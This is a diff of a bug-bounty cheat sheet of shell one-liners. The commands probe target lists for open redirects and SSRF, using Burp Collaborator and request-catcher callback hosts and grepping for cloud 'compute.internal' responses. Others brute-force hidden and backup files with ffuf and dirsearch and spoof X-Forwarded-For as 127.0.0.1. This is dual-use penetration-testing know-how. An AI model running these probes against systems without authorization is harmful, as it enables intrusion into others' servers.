@@ -96,9 +96,6 @@ cat subs.txt| waybackurls | gf redirect | qsreplace 'http://example.com' | httpx
 cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
 ```
 ```
-cat file.txt | while read host do;do curl --path-as-is --insecure "$host/?unix:(7701 A's here) | "https://bugbounty.requestcatcher.com/ssrf" | grep "request caught" && echo "$host \033[0;31mVuln\n" || echo "$host \033[0;32mNot\n";done
-```
-```
 cat wayback.txt | grep "=" | qsreplace "burpcollaborator_link" >> ssrf.txt; ffuf -c -w ssrf.txt -u FUZZ
 ```
 ----------------
@@ -139,13 +136,10 @@ cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http:/
 dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt
 ```
 ```
-for URL in $(<targets.txt); do ( ffuf -u "${URL}/FUZZ" -w wordlists.txt -ac ); done
-```
-```
 cat targets.txt | xargs -I@ sh -c 'ffuf -w wordlists.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -H "X-Forwarded-For:127.0.0.1"'
 ```
 ```
-ffuf -c -u target.com -H "Host: FUZZ" -w wordlist.txt 
+ffuf -c -w urls.txt:FUZZ1 -w wordlist.txt:FUZZ2 -u FUZZ1/FUZZ2 -mc 200 -ac -v -of html -o output
 ```
 **Search for Sensitive files from Wayback**
 ```
